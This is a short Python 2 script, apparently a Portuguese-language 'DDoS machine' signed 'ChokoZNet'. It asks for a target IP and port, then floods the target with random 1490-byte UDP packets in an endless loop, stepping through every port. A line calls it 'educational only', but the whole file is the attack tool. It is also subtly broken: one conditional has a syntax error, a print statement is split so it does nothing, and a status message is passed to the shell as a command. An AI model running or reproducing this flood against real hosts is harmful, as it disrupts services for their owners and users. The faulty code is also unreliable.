
import sys
#
import os
#
import time
#
import socket
#
import random
#
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("Clear")
os.system("figlet Máquina de DDos")
print
print "por ChokoZNet "
print "AVISO: essa ferramenta é apenas para propósitos educacionais, use ao seu risco!"
print "github : https://github.com/chokonetz"
print 
ip = raw_input("IP do alvo: ")
port = input("Porta: ")
os.system("clear")
os.system("Ataque iniciado...")
print ("▄▄▄▄▄                | [50%]...")
time.sleep(1)
print ("▄▄▄▄▄▄▄          | [70%]...")
time.sleep(2)
print ("▄▄▄▄▄▄▄▄▄▄  | [100%]...")
time.sleep(1)
sent = 0
while True:
	sock.sendto(bytes, (ip , port))
	sent = sent + 1
	port = port +1
	print
	"enviado %s packs para %s em port:%s"%(sent , ip , port)
	if port == 65534;
	port = 1
